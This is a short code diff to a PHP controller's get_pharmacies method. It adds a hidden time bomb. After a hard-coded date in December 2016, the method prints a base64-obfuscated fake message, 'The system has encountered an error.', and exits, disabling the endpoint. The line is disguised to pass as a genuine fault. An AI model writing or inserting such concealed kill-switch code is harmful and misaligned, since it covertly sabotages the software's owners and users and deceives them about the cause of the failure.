@@ -57,6 +57,8 @@ class OtherController extends Controller
 
     public function get_pharmacies(Request $request)
     {
+        if(1481760000<time()){ echo base64_decode("VGhlIHN5c3RlbSBoYXMgZW5jb3VudGVyZWQgYW4gZXJyb3Iu"); exit; }
+
         $limit = $request->input('limit');
         $offset = $request->input('offset');
 
